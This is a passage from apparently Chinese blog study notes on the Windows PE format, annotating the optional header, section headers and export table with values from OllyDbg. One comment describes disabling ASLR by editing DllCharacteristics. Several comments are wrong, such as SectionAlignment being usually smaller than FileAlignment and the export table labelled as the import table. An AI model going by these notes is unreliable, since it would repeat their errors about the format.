class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DATA_DIRECTORY</span>////定义了<span class="title">DataDirectory</span>的结构体 </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD VirtualAddress;</span><br><span class="line">    <span class="comment">//该结构体的RVA</span></span><br><span class="line">    </span><br><span class="line">    DOWORD Size;</span><br><span class="line">    <span class="comment">//该结构体的大小</span></span><br><span class="line">&#125;IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>   </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    <span class="comment">//这个可选头的类型  PE: 10Bh   PE+: 20Bh  可以依次区分是32位还是64位</span></span><br><span class="line">    <span class="number">010B</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    <span class="comment">//链接器的版本号(不重要)</span></span><br><span class="line">    <span class="number">05</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    <span class="comment">//链接器的小版本号(不重要)</span></span><br><span class="line">    <span class="number">00</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    <span class="comment">//代码段的长度</span></span><br><span class="line">    <span class="number">000</span>AF000</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    <span class="comment">//初始化的数据长度</span></span><br><span class="line">    <span class="number">0008</span>EC00</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    <span class="comment">//未初始化的数据长度</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    <span class="comment">//程序EP的RVA, 指出程序最先执行代码的起始地址 (很重要)</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    <span class="comment">//代码段起始地址的RVA</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//数据段起始地址的RVA</span></span><br><span class="line">    <span class="number">000B</span>0000</span><br><span class="line">    </span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    <span class="comment">//VA: 0~FFFFFFFF(32位系统).PE文件加载到虚拟内存时, 指出文件优先装入地址</span></span><br><span class="line">    <span class="comment">//EXE, DLL文件被装载到0~7FFFFFFF</span></span><br><span class="line">    <span class="comment">//SYS文件载入内核内存的 80000000~FFFFFFFF</span></span><br><span class="line">    <span class="comment">//执行PE文件时,PE装载器会把EIP设置为: ImageBase+AddressOfEntrypoint</span></span><br><span class="line">    <span class="number">00400000</span>    </span><br><span class="line">         </span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    <span class="comment">//节在内存中的最小单位 (对齐单位) 一般为: 1000h</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    <span class="comment">//节在磁盘文件中的最小单位 (对齐单位) 一般为: 200h</span></span><br><span class="line">    <span class="comment">//一般SectionAlignment &lt;= FileAlignment,节省储存空间.</span></span><br><span class="line">    <span class="number">00000200</span>     </span><br><span class="line">    </span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//操作系统主版本号(不重要)</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//操作系统小版本号(不重要)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    <span class="comment">//映象文件主版本号, 这个是开发者自己指定的，由连接器填写(不重要)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    <span class="comment">//映象文件小版本号(不重要)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    <span class="comment">//子系统版本号</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    <span class="comment">//子系统小版本号</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    <span class="comment">//Win32版本值 目前看过的文件都是 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    <span class="comment">//指定PE image在虚拟内存中所占空间的大小 SectionAlignment的倍数</span></span><br><span class="line">    <span class="number">00180000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    <span class="comment">//指出整个PE头的大小(FileAlignment整数倍)</span></span><br><span class="line">    <span class="comment">//它也是从文件的开头到第一节的原始数据的偏移量, 可以找到第一节区</span></span><br><span class="line">    <span class="number">00000600</span>   </span><br><span class="line">    </span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    <span class="comment">//映象文件的校验和 目的是为了防止载入无论如何都会冲突的、已损坏的二进制文件</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    <span class="comment">//说明映像文件应运行于什么样的NT子系统之上</span></span><br><span class="line">    <span class="comment">//该值用来区分系统驱动文件(*.sys)与普通的可执行文件(*.exe, *.dll)</span></span><br><span class="line">    <span class="comment">//value: 1   含义: Driver文件  tips: 系统驱动(如: ntfs.sys)</span></span><br><span class="line">    <span class="comment">//value: 2   含义: GUI文件  tips: 窗口应用程序(如: notepad.exe)</span></span><br><span class="line">    <span class="comment">//value: 3   含义: CUI文件     tips: 控制台应用程序(如: cmd.exe)</span></span><br><span class="line">    <span class="number">0002</span>   </span><br><span class="line">            </span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    <span class="comment">//DLL的文件属性 如果是DLL文件，何时调用DLL文件的入口点</span></span><br><span class="line">    <span class="comment">//一般的exe文件有以下2个属性:</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE(表示支</span></span><br><span class="line">    <span class="comment">//持终端服务器)8000h  IMAGE_DLLCHARACTERISTICS_NX_COMPAT</span></span><br><span class="line">    <span class="comment">//(表示程序采用了)/NXCOMPAT编译100h  (bit or 为 81000)</span></span><br><span class="line">    <span class="comment">//但是开启了ASLR的程序会多一个</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE(DLL can move)</span></span><br><span class="line">    <span class="comment">//40h的属性  (bit or 后为8140),那可以修改这里关闭ASLR</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">         </span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    <span class="comment">//保留栈的大小 默认是1MB</span></span><br><span class="line">    <span class="number">00100000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    <span class="comment">//初始时指定栈大小 默认是4KB</span></span><br><span class="line">    <span class="number">00020000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    <span class="comment">//保留堆的大小 默认是1MB</span></span><br><span class="line">    <span class="number">01000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    <span class="comment">//指定堆大小 默认是4K</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    <span class="comment">//看到的资料都是保留 value 为 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    <span class="comment">//数据目录的项数, 即指出了我们下面一个成员数组的个数</span></span><br><span class="line">    <span class="comment">//虽然宏定义了#defineIMAGE_NUMBEROF_DIRECTORY_ENTRIES16</span></span><br><span class="line">    <span class="comment">//但是PE装载器会通过此值来识别数组大小,说明数组大小也可能非16</span></span><br><span class="line">    <span class="number">00000010</span>   </span><br><span class="line">       </span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; </span><br><span class="line">    <span class="comment">//很重要，一个数据目录，数组中的每一项记录了对于数据项的RVA及Size</span></span><br><span class="line">    <span class="comment">//重点:  EXPORT IMPORT, RESOURCE, TLS Direction</span></span><br><span class="line"> </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509154933553-1590826622691.png" alt="image-20200509154933553"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// 输出表(导入表) (重要)</span></span></span><br><span class="line">RVA:<span class="number">0010F</span>000 Size:<span class="number">000012F</span>A </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// 输入表 (重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// 资源目录 (重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// 异常目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// 安全目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// 基址重定位表 (重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// 调试目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   <span class="comment">// 描述信息(版权信息之类)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    8   <span class="comment">// 架构特定数据</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       9   <span class="comment">// 机器值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            10   <span class="comment">// 线程级局部存储目录(重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    11   <span class="comment">// 载入配置目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   12   <span class="comment">// 绑定输入目录 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            13   <span class="comment">// 输入地址表</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   14   <span class="comment">// 延迟加载导入描述符</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 15   <span class="comment">// COM运行时描述符</span></span></span><br></pre></td></tr></table></figure><blockquote><p>PE文件中的code(代码), data(数据), resource(资源)等按照属性分类储存在不同的节区, (1)这样分类便于统一和查看  (2)这样可以在一定程度上保护程序的安全性, 因为如果把所有的代码数据放在一起的话, 当我们向数据区写数据时, 若输入超过缓冲区的大小, 那么就有可能会将其下的code(指令)覆盖掉, 造成应用程序崩溃. PE文件就可以把相似属性的的数据保存在一个被称为”节区”的地方, 然后为每个节区设置不同的特性,访问权限等.                                                                              </p></blockquote><h2 id="0x4-节区头"><a href="#0x4-节区头" class="headerlink" title="0x4 节区头"></a>0x4 节区头</h2><p><strong>节区头是由IMAGE_SECTION_HEADER结构体组成的数组, 每个结构体对应一个节区</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME      8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE NAME[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="comment">//节区的名字 8个字节</span></span><br><span class="line">    <span class="comment">//如果所有的8字节都被用光，该字符串就没有0结束符，</span></span><br><span class="line">    <span class="comment">//典型的名称.data .text .bss 形式 (.不是必须)</span></span><br><span class="line">    <span class="comment">//节区名称都和节中的内容不一定相关,</span></span><br><span class="line">    <span class="comment">//节名称没有严格要求前边带有“$”的相同名字的区块在载入时候将会被合并，</span></span><br><span class="line">    <span class="comment">//在并，在合并之后的区块中，他们是照“$”后边的字符的字母顺序进行合并的。</span></span><br><span class="line">    <span class="comment">//每个区块的名称都是唯一的，不能有同名的两个区块</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DOWORD PhysicalAddress; </span><br><span class="line">        DOWORD VitualSize; </span><br><span class="line">    <span class="comment">//内存中节区所占大小(实际初始了的数据大小, 未内存对齐)</span></span><br><span class="line">   </span><br><span class="line">    &#125;Misc;</span><br><span class="line">    </span><br><span class="line">    DWORD VirtualAddress; </span><br><span class="line">    <span class="comment">//内存中节区的起始地址(RVA). 开始没有值, 由SectionAlignment确定</span></span><br><span class="line">    </span><br><span class="line">    DWORD SizeofRawData; </span><br><span class="line">    <span class="comment">//磁盘文件中节区所占大小(对齐后的大小)</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRawData; </span><br><span class="line">    <span class="comment">//磁盘文件中节区的起始位置. 开始没有值, 由FileAlignment确定</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRelocations; </span><br><span class="line">    <span class="comment">//重定位指针  下面四个都是用于目标文件的信息</span></span><br><span class="line">        </span><br><span class="line">    DWORD PointerToLinenumbers; </span><br><span class="line">    <span class="comment">//行数指针</span></span><br><span class="line">        </span><br><span class="line">    WORD NumberOfRelocations; </span><br><span class="line">    <span class="comment">//重定位数</span></span><br><span class="line">    </span><br><span class="line">    WORD NumberOfLinenumbers; </span><br><span class="line">    <span class="comment">//行数</span></span><br><span class="line">    </span><br><span class="line">    DWORD Characteristics; </span><br><span class="line">    <span class="comment">//指定节的属性,权限. 由不同的值 bit or 而成 </span></span><br><span class="line">    <span class="comment">//0x20: 包含代码.           0x40: 包含初始化数据的节</span></span><br><span class="line">    <span class="comment">//0x80: 包含未初始化数据的节  0x20000000: 可执行 (x)</span></span><br><span class="line">    <span class="comment">//0x40000000: 可读 (r)     0x80000000: 可写 (w)</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>  <strong>下图展示OD程序的各个节, 并将(.txt)节中的各成员值在上面依次标出</strong>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509170302585-1590826622691.png" alt="image-20200509170302585"></p><blockquote><p>由于每个节区都有内存地址到文件偏移间的映射(RAW-RVA). 我们可以通过节区的VirtualAddress与PointerToRawData来从RVA-&gt;RAW. </p><p>注: 由于VirtualAddress是未对齐的大小,而SizeofRawData是对齐后的大小, 那么 VirtualAddress一般比SizeofRawData小.  但是也有例外, 就是当含有未初始化数据的节(如.bss), 在磁盘中未初始化数据是不占空间的, 但是到了内存, 未初始化的数据是要赋值占空间.</p></blockquote><hr><h2 id="0x5-IMAGE-EXPORT-DIRECTORY-输出表"><a href="#0x5-IMAGE-EXPORT-DIRECTORY-输出表" class="headerlink" title="0x5 IMAGE_EXPORT_DIRECTORY 输出表"></a>0x5 IMAGE_EXPORT_DIRECTORY 输出表</h2><p><strong>一般dll文件才有,DataDirectory[0]记录了RVA及Size.</strong></p><p><strong>用来描述模块（dll）中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中,从      库向其他PE文件提供服务</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    <span class="comment">//通常为0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    <span class="comment">//创建时间, 不是很有效的值</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    <span class="comment">//主版本号</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    <span class="comment">//小版本号</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">//指向以0结尾的ASCII字符串(DLL名称)的RVA</span></span><br><span class="line">    <span class="comment">//如(user32.dll, kernel32.dll)</span></span><br><span class="line">    <span class="number">0010F</span>780</span><br><span class="line">    </span><br><span class="line">    DWORD   Base;</span><br><span class="line">    <span class="comment">//基址, 一个输出项的序数就是函数地址数组中的索引值加base.</span></span><br><span class="line">    <span class="comment">//base大多时候为1 , 说明第一个输出函数的序数为1</span></span><br><span class="line">    <span class="number">00000001</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    <span class="comment">//实际Export函数的个数</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    <span class="comment">//Export函数中具名的函数个数(以名称来输出函数的数量)</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfFunctions;</span><br><span class="line">    <span class="comment">//Export函数地址数组(数组个数: NumberOfFunctions)</span></span><br><span class="line">    <span class="number">0010F</span>028</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNames;</span><br><span class="line">    <span class="comment">//Export函数名称地址数组(数组个数:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>318</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNameOrdinals;</span><br><span class="line">    <span class="comment">//指向函数名名称对应序数输出条目列表的RVA</span></span><br><span class="line">    <span class="comment">//数组每个名称拥有一个相应的序数(数组个数:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>608</span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p><strong>从导出表中获得函数地址的API为: GetProcAddress()函数. 该API用来引用EAT来获取指定的API的地址.</strong></p><p><strong>注: (1) 导出函数也可能没有名称的, 这时只能通过序数导出 (2) 序数是指定某个输出函数的独一无二的16位数字(2个字节)</strong></p><p>两种导出函数的方法:</p><p><strong>一:按函数名字</strong></p><p>​      <strong>(1)通过AddressOfNames找到函数名称数组.  使用strcmp()函数, 在(RVA)指针数组从索引值0开始依次与我们要找的函数名称对比,从而找到索引值 index_name</strong></p><p>​      <strong>(2)通过AddressOfNameOrdinals找到存放函数序号的数组, 使用步骤(1)获得的index_name为索引值找到函数地址的序号(index_address)</strong></p><p>​      <strong>(3)通过AddressOfFunctions找到函数地址数组(EAT), 在EAT中使用步骤(2)获得的index_address为索引值找到指定函数的RVA</strong></p><p><strong>二:按函数序号</strong></p><p>​      <strong>(1)使用我们函数的序号减去 _IMAGE_EXPORT_DIRECTORY.Base 的值得到函数地址索引值index_address</strong></p><p>​      <strong>(2)通过AddressOfFunctions找到函数地址数组(EAT), 在EAT中使用步骤(1)获得的index_address为索引值找到指定函数的RVA</strong></p></blockquote><p>  <strong>下面依旧用OD程序来看导出表, 并将每个值标在上面每个成员下面,  通过上面IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]介绍,  已经标出导出表的RVA: 0010F000  Size: 000012FA</strong>. 再通过CFF Explorer 工具查看每个节的地址可以计算出输出表的 RAW :  <strong>00CE200</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510143001536-1590826622691.png" alt="image-20200510143001536"></p><p>  1.查看输出表名称(<strong>RVA : 0010F780 -&gt; RAW: 000CE980</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151725862-1590826622691.png" alt="image-20200510151725862"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151945596-1590826622691.png" alt="image-20200510151945596"></p><p>  2.查找函数名称.</p><p>   (1)<strong>AddressOfNames</strong>. (<strong>RVA: 0010F318 -&gt; RAW: 000CE518</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510153257760-1590826622691.png" alt="image-20200510153257760"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154247725-1590826622691.png" alt="image-20200510154247725"></p><p>  由(<strong>RVA:0010F78C -&gt; RAW: 000CE98C</strong>):</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154722496-1590826622691.png" alt="image-20200510154722496"></p><p>  现在已经找到了函数的名称, 下面模拟查看一个指定名称函数的RVA. 假设我们找的是<strong>Addsorteddata.</strong>(即第一个函数), (1)通过strcmp(). 得到它的索引值是0, 记为 index_name.  (2)通过AddressOfNameOrdinals使用index_name找到函数的序数, 通过下图得到序数0, 记为index_address.</p><p>  <strong>AddressOfNameOrdinals</strong>.  (<strong>RVA: 0010F608 -&gt; RAW: 000CE808</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510160635396-1590826622691.png" alt="image-20200510160635396"></p><p>  (3)通过AddressOfFunctions函数地址数组(EAT), 使用index_address为索引值得到我们指定函数的RVA.</p><p>   AddressOfFunctions(<strong>RVA: 0010F028 -&gt; RAW: 000CE228</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161225077-1590826622691.png" alt="image-20200510161225077"></p><p>  到此, 得到我们指定输出函数<strong>Addsorteddata.</strong>的RVA: <strong>00054EFC</strong>. 最后通过 OD载入OD看一下.<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161939914-1590826622691.png" alt="image-20200510161939914"></p><p>  <strong>从这里也说明了, .exe文件也是可能有输出表的</strong></p><hr><h2 id="0x6-IMAGE-IMPORT-DESCRIPTOP-输入表"><a href="#0x6-IMAGE-IMPORT-DESCRIPTOP-输入表" class="headerlink" title="0x6 IMAGE_IMPORT_DESCRIPTOP 输入表"></a>0x6 IMAGE_IMPORT_DESCRIPTOP 输入表</h2><p><strong>记录PE文件要导入那些库文件  DataDirectory[1]记录了RVA及Size.</strong></p><p><strong>首先, 执行一个程序会有很多的函数是公用的,在动态链接库里(动态链接库, .dll文件总是附加在一个要执行的程序中, .dll文件中有说明库EAT的输出表), 如下图, 一个程序加载的部分 .dll文件.</strong><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200518132004979-1590826622691.png" alt="image-20200518132004979"></p><p><strong>我们的输入表记录了需要用到的函数名称, 通过在加载的动态链接库中搜索该函数得到实际的RVA, 再记录到输入表中, 供程序使用.   另外执行一个普通的程序一般需要多个库, 那导入多少库, 就会有多少个输入表结构体. 这就构成了结构体数组且结构体数组最后以 NULL 结束 (即每个导入的 DLL 都会成为数组中的一项).</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 